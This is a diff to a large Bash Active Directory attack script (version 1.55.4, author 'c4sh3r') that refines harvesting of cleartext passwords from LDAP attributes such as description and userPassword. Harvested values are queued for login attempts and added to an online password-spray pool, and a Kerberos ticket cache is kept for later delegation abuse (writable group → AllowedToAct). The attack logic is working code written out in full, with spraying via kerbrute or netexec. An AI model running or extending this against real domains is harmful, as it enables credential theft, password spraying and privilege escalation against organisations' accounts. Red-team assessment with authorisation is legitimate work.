@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.55.3"
+readonly VERSION="1.55.4"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -2563,8 +2563,8 @@ _is_pw_shaped() {
 # ===========================================================================
 #  CREDENTIALS IN DIRECTORY ATTRIBUTES  —  cleartext / legacy passwords admins
 #  stash in description / info / comment / userPassword / unixUserPassword. One LDAP
-#  read, very high hit-rate. Each value is queued against its OWNING account (safe,
-#  single attempt); only password-shaped values also enter the online spray pool.
+#  read, very high hit-rate. Explicit passwords and password-shaped/cued values are
+#  queued against their OWNING account; generic descriptive prose is report-only.
 # ===========================================================================
 phase_attr_passwords() {
     [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
@@ -2597,24 +2597,35 @@ phase_attr_passwords() {
             dec=$(printf '%s' "$val" | base64 -d 2>/dev/null)
             [[ -n "$dec" && "$dec" =~ ^[[:print:]]+$ ]] && val="$dec"
         fi
-        found=1
         detail "  ${C_YELLOW}${sam}${C_RESET} ${C_DIM}[${attr}]${C_RESET} → ${C_BOLD}${val}${C_RESET}"
         printf '%-24s %-16s %s\n' "$sam" "$attr" "$val" >>"$OUTDIR/attribute_creds.txt"
-        # Always try the whole value against its OWN owner (one attempt, lockout-safe) —
-        # covers the case where the attribute IS the password.
-        note_cred_source "$sam" "password in AD attribute '$attr'"
-        queue_cred "$sam" "$val" "" "password in $attr"
-        _is_pw_shaped "$val" && add_secret "$val" "AD attribute '$attr' of $sam"
-        # Also mine password-shaped TOKENS out of prose ("Password is Summer2024!" →
-        # Summer2024!): try each against the owner and add it to the online spray pool.
-        local tok
-        for tok in $val; do
-            [[ "$tok" == "$val" ]] && continue
-            if _is_pw_shaped "$tok"; then
-                add_secret "$tok" "token in '$attr' of $sam"
-                queue_cred "$sam" "$tok" "" "token in $attr"
-            fi
-        done
+        # Explicit password attributes are high-confidence. For free-form prose,
+        # queue a whole value only when it is a single password-shaped token. This
+        # rejects stock descriptions such as "Built-in account for administering
+        # the computer/domain", which previously became several fake credentials.
+        local explicit=0 prose="${val,,}"
+        [[ "${attr,,}" == *password ]] && explicit=1
+        if [[ "$explicit" == "1" ]] || _is_pw_shaped "$val"; then
+            note_cred_source "$sam" "password in AD attribute '$attr'"
+            queue_cred "$sam" "$val" "" "password in $attr"
+            _is_pw_shaped "$val" && add_secret "$val" "AD attribute '$attr' of $sam"
+            found=1
+        fi
+        # Mine tokens from prose only when the text explicitly labels a secret.
+        # Skip the label itself (Password:, pwd=, secret, …).
+        if [[ "$explicit" != "1" && "$prose" =~ (password|passwd|pwd|credential|secret|passcode) ]]; then
+            local tok tl
+            for tok in $val; do
+                [[ "$tok" == "$val" ]] && continue
+                tl="${tok,,}"; tl="${tl//[:=]/}"
+                [[ "$tl" =~ ^(password|passwd|pwd|credential|credentials|secret|passcode|is)$ ]] && continue
+                if _is_pw_shaped "$tok"; then
+                    add_secret "$tok" "token in '$attr' of $sam"
+                    queue_cred "$sam" "$tok" "" "token in $attr"
+                    found=1
+                fi
+            done
+        fi
     done <<<"$flat"
     if [[ "$found" == "1" ]]; then
         loot "★ Harvested credential material from directory attributes → attribute_creds.txt"
@@ -4339,10 +4350,10 @@ _group_refresh_pac() {
     REQUEUED_SELF["$_rqk"]=1
     if [[ -n "$PASS$HASH" ]]; then
         unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "$HASH")]"
-        # Only discard the cache when we can mint its replacement. Ticket-only
-        # pivots must retain their one usable credential.
-        [[ -n "$KERB_TICKET" ]] && rm -f "$KERB_TICKET" "$OUTDIR/$(_safe_name "$USER").ccache" 2>/dev/null
-        KERB_TICKET=""; unset KRB5CCNAME
+        # Keep the CURRENT cache for the remainder of this assessment. Kerberos-only
+        # domains need it for subsequent LDAP writes (for example a writable-group →
+        # AllowedToAct bridge). The queued credential's next assessment resets runtime
+        # auth and phase_validate_creds overwrites this cache with a fresh TGT/PAC.
         queue_cred "$USER" "$PASS" "$HASH" "re-auth after joining '$grp' (fresh PAC)"
     else
         warn "  membership in '$grp' is present but only a ticket is held → retain it; obtain the account secret for a fresh PAC"
